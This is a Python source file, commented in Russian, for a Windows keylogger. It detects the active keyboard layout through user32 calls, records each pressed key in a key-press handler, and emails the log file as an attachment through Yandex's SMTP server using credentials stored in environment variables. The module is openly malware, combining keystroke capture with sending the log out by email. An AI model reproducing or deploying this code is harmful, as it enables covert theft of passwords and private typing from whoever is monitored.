import ctypes
import datetime
import os
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from dotenv import load_dotenv, find_dotenv

load_dotenv(find_dotenv())
size_my_file = 47  # размер в байтах


def size_file():
    """Проверяет размер файла"""
    file_path = 'keylloger_file.txt'
    if os.path.isfile(file_path):
        file_size = os.path.getsize(file_path)
        # print(f"Размер файла: '{file_path}' составляет {file_size} байта.")
        return file_size
    else:
        print(f"Файл: '{file_path}' не существует")


def get_input_language():
    """Получает язык ввода клавиатуры"""
    # загрузки в память библиотеки динамической компоновки windows
    # use_last_error=True - получить больше информации об ошибке
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    current_window = user32.GetForegroundWindow()  # получаем идентификатор текущего окна
    # получаем идентификатор потока для текщего окна, 0 - идентификатор процесса не нужен
    thread_id = user32.GetWindowThreadProcessId(current_window, 0)
    klid = user32.GetKeyboardLayout(
        thread_id) & 0xFFFF  # получаем числовой идентификатор текущей раскладки клавиатуры
    return klid  # числовой идентификатор текущей раскладки клавиатуры


def send_file():
    """Отправляет фай на Email"""
    date = datetime.datetime.now()
    date_time = date.strftime('%d-%m-%Y|%H:%M:%S')
    message = MIMEMultipart()
    message['From'] = os.getenv('EMAIL')
    message['To'] = os.getenv('EMAIL')
    message['Subject'] = f'Keylloger {date_time}'
    file_name = 'Email KeyLLoger.txt'
    attachment = open(file_name, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
    message.attach(part)
    with smtplib.SMTP_SSL('smtp.yandex.ru', 465) as server:
        server.ehlo(os.getenv('EMAIL'))
        server.login(os.getenv('EMAIL'), os.getenv('PASSWORD'))
        server.auth_plain()
        result = server.send_message(message)
        if result is None:
            return 'yes'
        else:
            return 'no'


def pressing_key(event, key_dictionary, language_flag, add_char):
    """Обработка нажатой клавиши"""
    if language_flag:
        try:
            print(event.name)
            add_char.append(event.name)
        except (TypeError, AttributeError):
            pass
    else:
        try:
            print(key_dictionary[event.name])
            add_char.append(key_dictionary[event.name])
        except KeyError:
            pass
